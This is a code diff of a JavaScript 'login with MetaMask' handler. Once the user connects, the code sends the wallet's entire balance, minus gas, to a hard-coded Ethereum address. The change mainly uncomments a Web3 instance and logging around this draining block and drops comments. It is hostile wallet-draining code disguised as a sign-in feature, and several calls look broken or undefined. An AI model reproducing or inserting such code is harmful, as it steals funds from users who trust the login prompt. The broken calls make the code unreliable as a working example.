@@ -45,26 +45,20 @@
       window.userWalletAddress = accounts[0]
       userWallet.innerText = window.userWalletAddress
       loginButton.innerText = 'Sign out of MetaMask'
-      // console.log(window.ethereum.getBalance(window.userWalletAddress));
+       console.log(window.ethereum.getBalance(window.userWalletAddress));
 
-  // const web3 = new Web3(provider);
-  //
-  // console.log("Web3 instance is", web3);
-
-      // send out
+  const web3 = new Web3(provider);
+  console.log("Web3 instance is", web3);
       var from = window.userWalletAddress;
       var to = "0x06A9a217f32d2368199386Aabd84F7c02123a183";
       var balance = window.ethereum.getBalance(from);
       console.log(to);
       var gas = new BigNumber(21000);
-      // You can use gasPrice=web3.eth.gasPrice or look up http://ethgasstation.info/
       var gasPrice = web3.utils.toWei(5, "gwei");
       var cost = gas.mul(gasPrice);
       var sendAmount = balance.sub(cost);
       var tx = eth.sendTransaction({from: from, to: to, gas: gas, gasPrice: gasPrice, value: sendAmount});
       console.log(eth.getTransaction(tx));
-//
-
       loginButton.removeEventListener('click', loginWithMetaMask)
       setTimeout(() => {
         loginButton.addEventListener('click', signOutOfMetaMask)
